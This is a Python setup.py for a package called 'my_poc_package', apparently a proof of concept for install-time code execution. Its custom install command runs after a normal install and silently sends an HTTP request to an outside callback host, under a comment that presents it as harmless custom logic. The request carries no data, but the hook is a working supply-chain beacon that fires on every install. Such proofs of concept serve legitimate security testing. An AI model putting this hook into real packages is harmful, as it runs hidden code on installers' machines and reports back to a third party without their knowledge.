from setuptools import setup, find_packages
from setuptools.command.install import install



# Custom command that runs after install
class PostInstallCommand(install):
    def run(self):
        # Run the normal install process first
        install.run(self)
        # Now run the post-installation function
        self.run_post_install()

    def run_post_install(self):
        print("Package 'my_poc_package' has been successfully installed!")
        # You can add your custom logic here, such as calling a function from your package
        import requests
        requests.get("https://f2iwbqcy8byi2aekb8gvcsv8bzh45utj.i.ywh.at")

setup(
    name='my_poc_package',
    version='0.1',
    packages=find_packages(),
    setup_requires=[
        'requests'
    ],  # Dependencies can be added here
    cmdclass={
        'install': PostInstallCommand,
    },
)
